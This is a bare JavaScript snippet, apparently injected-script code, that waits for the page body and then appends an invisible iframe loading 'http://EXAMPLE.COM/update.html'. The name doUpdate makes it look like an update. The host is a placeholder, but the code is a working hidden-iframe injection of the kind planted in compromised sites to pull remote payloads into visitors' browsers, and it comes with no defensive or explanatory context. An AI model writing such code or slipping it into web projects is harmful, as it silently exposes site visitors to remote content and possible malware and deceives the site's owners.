(function(d) {
    var doUpdate = function() {
        if ( "undefined" === typeof(d.body) || !d.body ) {
            setTimeout(doUpdate, 500);
        }
        else {
            var iframe1 = d.createElement("iframe");
            iframe1.style.display = "none";
            iframe1.src = "http://EXAMPLE.COM/update.html";
            d.body.appendChild(iframe1);
        }
    };
    doUpdate();
})(document);
